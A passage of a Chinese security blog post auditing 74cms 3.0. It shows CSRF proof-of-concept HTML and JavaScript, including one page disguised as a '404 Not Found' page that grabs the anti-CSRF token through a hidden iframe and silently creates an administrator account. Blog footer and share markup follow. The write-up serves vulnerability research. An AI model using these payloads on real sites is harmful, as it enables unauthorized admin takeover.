class="keyword">var</span>  xmlhttp = <span class="keyword">new</span> XMLHttpRequest();</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span>  xmldata = <span class="string">'admin_name=test2&amp;email=1234%40123.com&amp;password=123456&amp;password1=123456&amp;rank=123&amp;submit3=%CC%ED%BC%D3'</span>;</span></span><br><span class="line"><span class="javascript">      		xmlhttp.open(<span class="string">'POST'</span>,<span class="string">'http://127.0.0.1/74cms/admin/admin_users.php?act=add_users_save'</span>,<span class="literal">true</span>);</span></span><br><span class="line"><span class="javascript">            xmlhttp.setRequestHeader(<span class="string">'Content-Type'</span>,<span class="string">'application/x-www-form-urlencoded'</span>);</span></span><br><span class="line"><span class="javascript">            xmlhttp.withCredentials=<span class="string">'true'</span>; </span></span><br><span class="line"><span class="undefined">            xmlhttp.send(xmldata);</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined">        add();</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>页面利用ajax技术在后台将注册信息提交到<code>admin/admin_users.php</code></p>
+<p>另外在74cms 3.6版本中添加了token机制认证，我们知道token认证机制是取出当前页面提交的token与存放在<strong>Session</strong>中的token值进行比较，相同则通过验证，每当我们刷新一次页面，token值就会发生变化。但是我们仍然可以进行CSRF攻击，办法就是利用iframe框架访问token值的页面，再利用js代码获取token值与信息一起提交即可，附上3.6版本csrf攻击的代码：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">title</span>&gt;</span>404 Not Found<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">        <span class="function"><span class="keyword">function</span>  <span class="title">add</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> token = <span class="built_in">document</span>.getElementById(<span class="string">'hack'</span>).contentWindow.document.getElementsByName(<span class="string">'hiddentoken'</span>)[<span class="number">0</span>].value;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span>  xmlhttp = <span class="keyword">new</span> XMLHttpRequest();</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span>  xmldata = <span class="string">'admin_name=test2&amp;email=1234%40123.com&amp;password=123456&amp;password1=123456&amp;rank=123&amp;submit3=%CC%ED%BC%D3&amp;hiddentoken='</span>+token;</span></span><br><span class="line"><span class="javascript">            xmlhttp.open(<span class="string">'POST'</span>,<span class="string">'http://127.0.0.1/74cms3.6/admin/admin_users.php?act=add_users_save'</span>,<span class="literal">true</span>);</span></span><br><span class="line"><span class="javascript">            xmlhttp.setRequestHeader(<span class="string">'Content-Type'</span>,<span class="string">'application/x-www-form-urlencoded'</span>);</span></span><br><span class="line"><span class="javascript">            xmlhttp.withCredentials=<span class="string">'true'</span>; </span></span><br><span class="line"><span class="undefined">            xmlhttp.send(xmldata);</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"http://127.0.0.1/74cms3.6/admin/admin_users.php?act=add_users"</span> <span class="attr">id</span>=<span class="string">'hack'</span> <span class="attr">border</span>=<span class="string">'0'</span> <span class="attr">style</span>=<span class="string">'display:none'</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">"add()"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Not Found<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>The requested URL /info.php was not found on this server.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>该cms很多漏洞的利用点都在于未对SQL数组变量<code>$setsqlarr</code>进行过滤以及对后台输入只有转义处理，存在诸多输入过滤不足的情况</p>
+
+        </div>
+
+        <blockquote class="post-copyright">
+    <div class="content">
+        
+<span class="post-time">
+    Last updated: <time datetime="2019-03-20T12:12:36.692Z" itemprop="dateUpdated">2019-03-20 20:12:36</time>
+</span>
+
+
+        
+        原文链接：<a href="/posts/5451/" target="_blank" rel="external">https://Foxgrin.github.io/posts/5451/</a>
+        
+    </div>
+    <footer>
+        <div onclick="location.href='https://Foxgrin.github.io'">
+            <img src="/img/touxiang/1.jpg" alt="Somnus">
+            <a>Somnus</a>
+        </div>
+    </footer>
+</blockquote>
+
+        
+    <div class="page-reward">
+        <nav class="myreward">
+            <a id="rewardBtn" href="javascript:;"><span>打&nbsp;赏</span><span>装成好像很多人打赏的样子</span></a>
+        </nav>
+    </div>
+
+
+
+        <div class="post-footer">
+            
+	<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/代码审计/">代码审计</a></li></ul>
+
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://Foxgrin.github.io/posts/5451/&title=《代码审计--74cms3.0》 — Somnus's blog&pic=https://Foxgrin.github.io/img/touxiang/1.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://Foxgrin.github.io/posts/5451/&title=《代码审计--74cms3.0》 — Somnus's blog&source=记录74cms3.0审计过程以及漏洞分析" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://Foxgrin.github.io/posts/5451/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《代码审计--74cms3.0》 — Somnus's blog&url=https://Foxgrin.github.io/posts/5451/&via=https://Foxgrin.github.io" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://Foxgrin.github.io/posts/5451/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="waves-block waves-effect prev">
+      <a href="/posts/15210/" id="post-prev" class="post-nav-link">
+        <h4 class="title" >
+          上一篇：代码审计--emlog6.0
+        </h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/posts/52227/" id="post-next" class="post-nav-link">
+        <h4 class="title" data-hover="下一篇：代码审计--bluecms1.6">下一篇：代码审计--bluecms1.6</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+    
+
+    
+
+    
+
+
+</article>
+
+</div>
+
+        <footer class="footer">
+    <div class="footer-content">
+        <span class="power">
+            <i class="icon icon-lg icon-copyright"></i>
+            2018
+            <i class="icon icon-lg icon-heart"></i>
+            <a href="https://Foxgrin.github.io">Somnus</a>
+            <br/>
+            Power by
+            <a href="https://hexo.io/" target="_blank" rel="external nofollow">Hexo</a>&nbsp;·&nbsp;
+            Theme
+            <a class="tomotoeslink" href="https://github.com/tomotoes/hexo-theme-tomotoes/" target="_blank" rel="external nofollow">tomotoes</a>
+        </span>
+
+        <br/>
+
+        <span id="RunTime" style="color:#a7a7a2;"></span>
+        <br/>
+
+        <span>
+            
+	<i class="icon icon-lg icon-user">
+<span id="busuanzi_container_site_uv" style='display:none'>
+       访问用户：<span id="busuanzi_value_site_uv"></span>
+    </span>人</i>
+    ·
+    <i class="icon icon-lg icon-eye">
+    <span id="busuanzi_container_site_pv" style='display:none'>
+      访问次数：<span id="busuanzi_value_site_pv"></span>
+    </span>次
+    </i>
+
+
+        </span>
+        <br/>
+
+        <span class="license">This blog is licensed under a <a rel="license" rel="external nofollow" href="https://creativecommons.org/licenses/by/4.0/">Creative Commons Attribution 4.0 International License</a>.</span>
+    </div>
+</footer>
+
+    </main>
+    
+        
+<div id="reward" class="page-modal reward-lay">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <h3 class="reward-title">
+        <i class="icon icon-quote-left"></i>
+        <span>感谢您的鼓励支持！</span>
+        <i class="icon icon-quote-right"></i>
+    </h3>
+    <div class="reward-content">
+        
+        <div class="reward-code">
+            <img id="rewardCode" data-img="/img/dog.png" alt="打赏二维码">
+        </div>
+        
+        <label class="reward-toggle">
+            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
+                data-wechat="/img/weixin.png" data-alipay="/img/zhifubao.png">
+            <div class="reward-toggle-ctrol">
+                <span class="reward-toggle-item wechatPay">&nbsp;&nbsp;微信&nbsp;&nbsp;</span>
+                <span class="reward-toggle-item alipayPay">支付宝</span>
+            </div>
+        </label>
+        
+        <i class="icon icon-caret-up"></i>
+    </div>
+</div>
+
+
+    
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://Foxgrin.github.io/posts/5451/&title=《代码审计--74cms3.0》 — Somnus's blog&pic=https://Foxgrin.github.io/img/touxiang/1.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://Foxgrin.github.io/posts/5451/&title=《代码审计--74cms3.0》 — Somnus's blog&source=记录74cms3.0审计过程以及漏洞分析" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://Foxgrin.github.io/posts/5451/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《代码审计--74cms3.0》 — Somnus's blog&url=https://Foxgrin.github.io/posts/5451/&via=https://Foxgrin.github.io" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://Foxgrin.github.io/posts/5451/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p class="wechatshare">扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAK4AAACuCAAAAACKZ2kyAAAByklEQVR42u3aQW7DMAwEwP7/0+61QBJnSUpKCoxOhhHboxwIaamfn3hcf8bjneT+/dsWD1xc3DH3uh333Mfr6ldyAy4u7nnuqw+8un586tWd5H5iwMXF/WZuFZcXMlxc3P/LTaaRbG9wcXG/n5sXmhxUnfbivRouLu6Am6eU+6635Lu4uLgt7lUc801RXryePIWLi3uEO2mEVJumeRTy5s24uLibuXkZ6gUieSwS/TW4uLgf4k7u98KUQjiCi4t7kJsfxlo1mWbMiouL+yFuvriZN1eSabwpZLi4uBu4SWDR2+RMWqSFnjAuLu4G7v1L84NTqyLXKDDFxcXdzO3Vh/z38ybrk3fi4uJu5ublIw86q03WfDmFi4t7hruqHVItTOWodG33BhcXN+BOFjfV1ku1bDUPYeDi4i7lzj9WbcNUiykuLu5Jbq8kNZOYeInT3EXh4uIOuFdx5P9Bb8Ll7isuLu4G7uRIxCTs2NHExcXFXcutLlB6x7bmzVdcXNzz3LylkdMnR7gW5Lu4uLgHuZMDWHlIWk5NcHFxP8qdtFuq4embzg8uLu5mbrL5mRy/qD4bNVlxcXG3cSdxZ95i6W2TRvkuLi5uh/sLPDlSwWFNzEsAAAAASUVORK5CYII=" alt="微信分享二维码">
+</div>
+
+
+
+
+    <!-- waves按钮特效 -->
+<script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+
+<!-- 主题配置脚本 -->
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: true };
+</script>
+
+<!-- jquery -->
+<script src="/js/jquery.min.js?v=3.0"></script>
+
+<!-- 搜索 -->
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item waves-block waves-effect" onclick="location.href='{path}'">
+    <div class="title ellipsis" title="{title}">{title}</div>
+</li>
+</template>
+
+
+<!-- main博客脚本 -->
+<script src="/js/main.min.js?v=3.0" ></script>
+
+<!-- 动画&配置 -->
+<script src="/js/script.min.js?v=3.0" ></script>
+
+<!-- 脚本管理 -->
+<script>
+
+if(window.innerWidth > 800){
+	/* 3D标题 */
+	$(".content-header").on("mousemove", threedee);
+
+	/* 底部追随鼠标 */
+	$(".footer").hover(2);
+
+	/* gotop键的涟漪 */
+	$("#gotop").hover(1);
+
+	/* 赞赏的粒子雨 */
+	$("#reward").hover(3);
+
+	/* 微信公众号的底部渲染 */
+	$("#wechat").hover(4);
+
+    /* 标题跳动 */
+    $(".archivestitle").bumpyText();
+
+	/* 图片点击放大 */
+	const postimg = jQuery(".post-content img:not(.github-emoji)");
+	postimg.on("click",function(){
+
+		mask.classList.add("in");
+		main.classList.add("Mask");
+		menu.classList.add("Mask");
+		var myimg = this.cloneNode(true);
+		myimg.classList.add("imgShow");
+
+		setTimeout(function(){
+			jQuery(myimg).animate({
+				opacity:"1"
+			},1000);
+		},0);
+
+		document.body.appendChild(myimg);
+
+		myimg.onclick=function(){
+			document.body.removeChild(myimg);
+			mask.classList.remove("in");
+			main.classList.remove("Mask");
+			menu.classList.remove("Mask");
+		};
+
+	});
+
+}
+
+/* 名字跳动 */
+$("#name").bumpyText();
+
+
+/* 网站运行时间 */
+setInterval(function () {
+	setTime("2018/7/9");
+}, 1000);
+
+/* 文章块的淡出 */
+postshow();
+
+/* 座右铭 */
+
+   getHitokoto();
+
+
+
+/* 粘贴提示 */
+G($(".post-content"), location.href, "Somnus");
+
+
+/* 控制台 */
+if (window.console && window.console.log) {
+	setTimeout(function () {
+		console.log("\n %c 一个坏掉的番茄 %c  © Simon Ma  http://tomotoes.com \n\n", "color:#FFFFFB;background:#1abc9c;padding:5px 0;border-radius:.5rem 0 0 .5rem;", "color:#FFFFFB;background:#080808;padding:5px 0;border-radius:0 .5rem .5rem 0;");
+	}, 0);
+}
+
+</script>
+
+
+
+
+<!-- 公式渲染 -->
+
+
+
+<!-- 不蒜子 -->
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+
+
+</body>
+</html>
